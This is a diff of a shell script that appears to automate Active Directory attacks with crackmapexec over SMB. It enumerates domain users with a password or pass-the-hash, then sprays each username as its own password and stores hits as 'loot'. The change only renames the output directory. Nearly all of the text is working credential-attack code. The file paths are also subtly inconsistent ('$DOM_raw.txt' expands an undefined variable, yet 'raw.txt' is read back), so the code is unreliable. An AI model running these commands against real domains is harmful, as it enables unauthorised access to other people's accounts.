@@ -79,8 +79,8 @@ then
     crackmapexec smb $IP -u $USER -p $PASS -d $DOM --users > /root/output/list/raw.txt
     awk '/445/ {print$5}' /root/output/list/raw.txt | cut -d '\' -f 2 | sed '/\x1b\[[0-9;]*[mGKHF]/d' | grep -v 'HealthMailbox' > /root/output/list/user.txt
     rm /root/output/list/raw.txt
-    crackmapexec smb $IP -u /root/output/list/user.txt -p /root/output/list/user.txt --no-bruteforce --continue-on-success >> /root/output/loot/intern/ad/iam/name_as_pass/$DOM_raw.txt
-    grep '+' /root/output/loot/intern/ad/iam/name_as_pass/raw.txt > /root/output/loot/intern/ad/iam/name_as_pass/$DOM_user.txt
+    crackmapexec smb $IP -u /root/output/list/user.txt -p /root/output/list/user.txt --no-bruteforce --continue-on-success >> /root/output/loot/intern/ad/iam/username_as_pass/$DOM_raw.txt
+    grep '+' /root/output/loot/intern/ad/iam/username_as_pass/raw.txt > /root/output/loot/intern/ad/iam/username_as_pass/$DOM_user.txt
  # keep the raw file for screens and debugging
 
  # Password policy
@@ -129,8 +129,8 @@ exit 0
     crackmapexec smb $IP -u $USER -H $HASH -d $DOM --users > /root/output/list/raw.txt
     awk '/445/ {print$5}' /root/output/list/raw.txt | cut -d '\' -f 2 | sed '/\x1b\[[0-9;]*[mGKHF]/d' | grep -v 'HealthMailbox' > /root/output/list/user.txt
     rm /root/output/list/raw.txt
-    crackmapexec smb $IP -u /root/output/list/user.txt -p /root/output/list/user.txt --no-bruteforce --continue-on-success >> /root/output/loot/intern/ad/iam/name_as_pass/$DOM_raw.txt
-    grep '+' /root/output/loot/intern/ad/iam/name_as_pass/raw.txt > /root/output/loot/intern/ad/iam/name_as_pass/$DOM_user.txt
+    crackmapexec smb $IP -u /root/output/list/user.txt -p /root/output/list/user.txt --no-bruteforce --continue-on-success >> /root/output/loot/intern/ad/iam/username_as_pass/$DOM_raw.txt
+    grep '+' /root/output/loot/intern/ad/iam/username_as_pass/raw.txt > /root/output/loot/intern/ad/iam/username_as_pass/$DOM_user.txt
  # keep the raw file for screens and debugging
 
  # Password policy
